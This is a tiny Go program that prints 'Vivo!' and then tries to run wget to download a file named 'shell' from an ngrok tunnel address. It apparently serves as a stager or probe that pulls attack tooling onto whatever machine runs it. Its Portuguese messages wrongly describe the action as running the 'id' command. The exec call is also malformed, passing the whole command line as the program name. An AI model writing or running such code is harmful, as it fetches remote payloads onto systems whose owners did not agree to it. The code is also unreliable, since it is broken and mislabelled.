package main

import (
        "fmt"
        "os/exec"
)

func main() {
        fmt.Println("Vivo!")
        cmd := exec.Command("wget https://4847-189-40-72-61.ngrok-free.app/shell")
        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro ao executar o comando id:", err)
        } else {
            fmt.Println("Saída do comando id:", string(output))
        }
}
